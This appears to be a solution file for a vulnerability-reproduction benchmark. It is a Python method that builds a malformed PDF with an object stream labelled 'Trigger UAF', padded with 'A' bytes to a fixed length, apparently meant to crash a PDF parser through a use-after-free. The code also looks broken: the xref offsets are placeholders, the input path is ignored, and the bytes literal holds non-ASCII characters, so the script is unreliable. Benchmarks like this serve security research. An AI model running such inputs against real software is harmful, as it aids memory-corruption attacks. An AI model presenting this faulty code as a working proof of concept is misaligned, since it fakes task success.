class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"""%PDF-1.4
%����
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 5 0 R>>>>>>
endobj
4 0 obj
<</Length 44>>
stream
BT
/F1 24 Tf
100 700 Td
(Hello World) Tj
ET
endstream
endobj
5 0 obj
<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>
endobj
6 0 obj
<</Type/ObjStm/N 1/First 10/Length 20>>
stream
7 0 42
(Trigger UAF)
endstream
endobj
xref
0 8
0000000000 65535 f 
0000000009 00000 n 
0000000075 00000 n 
0000000130 00000 n 
0000000220 00000 n 
0000000300 00000 n 
0000000400 00000 n 
0000000500 00000 n 
trailer
<</Size 8/Root 1 0 R>>
startxref
600
%%EOF
""" + b"A" * (6431 - len("""%PDF-1.4
%����
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 5 0 R>>>>>>
endobj
4 0 obj
<</Length 44>>
stream
BT
/F1 24 Tf
100 700 Td
(Hello World) Tj
ET
endstream
endobj
5 0 obj
<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>
endobj
6 0 obj
<</Type/ObjStm/N 1/First 10/Length 20>>
stream
7 0 42
(Trigger UAF)
endstream
endobj
xref
0 8
0000000000 65535 f 
0000000009 00000 n 
0000000075 00000 n 
0000000130 00000 n 
0000000220 00000 n 
0000000300 00000 n 
0000000400 00000 n 
0000000500 00000 n 
trailer
<</Size 8/Root 1 0 R>>
startxref
600
%%EOF
""".encode()))
        return poc.encode('latin-1') if isinstance(poc, str) else poc